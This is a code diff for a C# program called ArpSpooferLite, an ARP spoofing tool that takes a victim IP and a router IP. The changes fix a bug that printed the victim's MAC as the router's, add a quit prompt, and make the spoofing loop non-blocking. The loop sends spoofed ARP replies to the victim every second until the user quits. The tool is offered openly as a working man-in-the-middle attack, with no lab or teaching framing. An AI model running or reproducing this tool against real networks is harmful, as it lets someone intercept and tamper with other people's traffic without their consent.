@@ -13,10 +13,11 @@ namespace ArpSpooferLite
         {
             Console.WriteLine("ARP Spoofer Lite");
             Console.WriteLine("This is a simple ARP spoofer tool.");
-            // Check if the user has provided the necessary arguments
+            //Check if the user has provided the necessary arguments
             if (args.Length < 2)
             {
                 Console.WriteLine("Usage: ArpSpooferLite.exe <victim IP> <router IP>");
+                Console.WriteLine("Press 'Q' to quit the program.");
                 return;
             }
             string victimIp = args[0];
@@ -33,20 +34,27 @@ namespace ArpSpooferLite
             Console.WriteLine("Attacker Mac : " + attackerMac);
 
             string victimMac = GetMacByIp(victimIp);
-            Console.WriteLine("\nVictim Ip : " + victimIp); // TODO: change to targetIp
+            Console.WriteLine("\nVictim Ip : " + victimIp); 
             Console.WriteLine("Victim Mac : " + victimMac);
 
             string routerMac = GetMacByIp(routerIp);
             Console.WriteLine("\nRouter Ip : " + routerIp);
-            Console.WriteLine("Router Mac : " + victimMac);
+            Console.WriteLine("Router Mac : " + routerMac);
 
             LibPcapLiveDevice device = LibPcapLiveDeviceList.Instance.FirstOrDefault(d => d.Addresses.Any(a => a.Addr.ipAddress != null && a.Addr.ipAddress.ToString() == attackerIp));
 
             // Press Q to quit the program and restore the ARP tables of the victim and router.
-            while (Console.ReadKey().Key != ConsoleKey.Q)
+            while (true)
             {
+
                 SpoofArpReply(victimIp, victimMac, routerIp, routerMac, attackerIp, attackerMac, device);
                 Thread.Sleep(1000);
+
+                if(Console.KeyAvailable && Console.ReadKey(true).Key == ConsoleKey.Q)
+                {
+                    Console.WriteLine("Restoring ARP tables...");
+                    break;
+                }
             }
 
             for (int i = 0; i < 7; i++)
